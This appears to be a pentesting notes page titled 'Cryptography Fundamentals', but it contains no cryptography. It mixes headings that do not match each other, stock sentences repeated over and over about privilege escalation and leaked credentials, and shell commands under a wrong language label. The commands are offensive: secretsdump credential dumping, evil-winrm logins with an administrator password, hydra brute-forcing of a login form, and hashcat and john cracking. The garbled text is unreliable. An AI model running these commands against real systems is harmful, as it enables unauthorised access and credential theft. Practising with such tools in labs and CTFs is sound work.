---
TitleSEO: "Cryptography Fundamentals | ZureFX"
TitlePost: "Cryptography Fundamentals"
Author: "ZureFX"
Description: "Personal notes on Cryptography Fundamentals. Quick reference for pentesting and CTF challenges."
Keywords: "oscp, dfir, linux"
URL: "https://zurefx.github.io/notes/note-cryptography-fundamentals-462.html"
URL_IMAGES: ""
Date: "2025-05-04"
Tags: "OSCP, DFIR, Linux"
Section: "notes"
Lang: "en"
main_img: "note-cryptography-fundamentals-462"
Permalink: "/notes/note-cryptography-fundamentals-462.html"
BtnLabel: "Read Notes"
Pick: 0
---
## evil-winrm

### Debian

- `secretsdump`
- `AlwaysInstallElevated`
- `GPP Password`
- `XXE`
- `impacket`
- `Pass the Ticket`

```bash
impacket-secretsdump administrator:'P@ssw0rd!'@10.89.38.38
crackmapexec smb 10.110.86.187 -u administrator -p 'P@ssw0rd!' --shares
```

The application stored sensitive credentials in an unencrypted configuration file. Unconstrained delegation was enabled on the compromised machine. The backup files contained sensitive information that should not have been accessible.

Group Policy Preferences contained encrypted but recoverable credentials. Authentication bypass was achieved through careful manipulation of the login mechanism. Token impersonation allowed elevation to SYSTEM privileges on the target. The web application was vulnerable to Server-Side Template Injection (SSTI). Weak file permissions allowed modification of critical system files.

## IDOR

### psexec

The scheduled task ran with elevated privileges and could be abused for escalation. Weak file permissions allowed modification of critical system files. Post-exploitation enumeration revealed a path to domain administrator privileges. Lateral movement was facilitated by reusing discovered credentials across services. Privilege escalation was possible due to misconfigured sudo permissions.

```bash
ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://10.13.57.220/FUZZ
hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt --force
hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt --force
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
```

Network traffic analysis revealed unencrypted communications containing user credentials. The web application was vulnerable to Server-Side Template Injection (SSTI).

## SSRF

### LAPS Abuse

Post-exploitation enumeration revealed a path to domain administrator privileges. The web application was vulnerable to Server-Side Template Injection (SSTI). The scheduled task ran with elevated privileges and could be abused for escalation. The service was running without proper input validation, leading to injection vulnerabilities.

Lateral movement was facilitated by reusing discovered credentials across services. Authentication bypass was achieved through careful manipulation of the login mechanism. Unconstrained delegation was enabled on the compromised machine. Privilege escalation was possible due to misconfigured sudo permissions.

```python
nmap -sCV -p135,135,8888 10.82.102.8 -oN scan.txt
impacket-secretsdump administrator:'P@ssw0rd!'@10.28.206.53
evil-winrm -i 10.72.15.148 -u administrator -p 'P@ssw0rd!'
```

## POP3

### SMB

Post-exploitation enumeration revealed a path to domain administrator privileges. The scheduled task ran with elevated privileges and could be abused for escalation. Initial enumeration revealed several interesting open ports on the target. Privilege escalation was possible due to misconfigured sudo permissions.

```bash
ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://10.12.166.199/FUZZ
feroxbuster -h
```

- `atexec`
- `Path Traversal`
- `rubeus`
- `IDOR`
- `SSRF`
- `Local File Inclusion`

```powershell
feroxbuster -h
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.104.41.9 http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.14.241.163 http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'
```

Group Policy Preferences contained encrypted but recoverable credentials. Privilege escalation was possible due to misconfigured sudo permissions. Weak file permissions allowed modification of critical system files. Unconstrained delegation was enabled on the compromised machine. The backup files contained sensitive information that should not have been accessible.

## Command Injection

### impacket

```bash
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
evil-winrm -i 10.41.46.43 -u administrator -p 'P@ssw0rd!'
```

- `Resource-Based Constrained Delegation`
- `NTLM Relay`
- `Sudo Misconfiguration`
- `DLL Hijacking`
- `XSS`

Token impersonation allowed elevation to SYSTEM privileges on the target. Initial enumeration revealed several interesting open ports on the target.

The target system was identified as running a vulnerable version of the service. The database credentials were hardcoded in the application source code.

## burpsuite

### Remote Code Execution

Privilege escalation was possible due to misconfigured sudo permissions. The backup files contained sensitive information that should not have been accessible. Privilege escalation was possible due to misconfigured sudo permissions. Initial enumeration revealed several interesting open ports on the target.

Group Policy Preferences contained encrypted but recoverable credentials. The service was running without proper input validation, leading to injection vulnerabilities. Network traffic analysis revealed unencrypted communications containing user credentials. The scheduled task ran with elevated privileges and could be abused for escalation.

```bash
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.21.88.186 http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'
ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://10.45.37.133/FUZZ
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
```
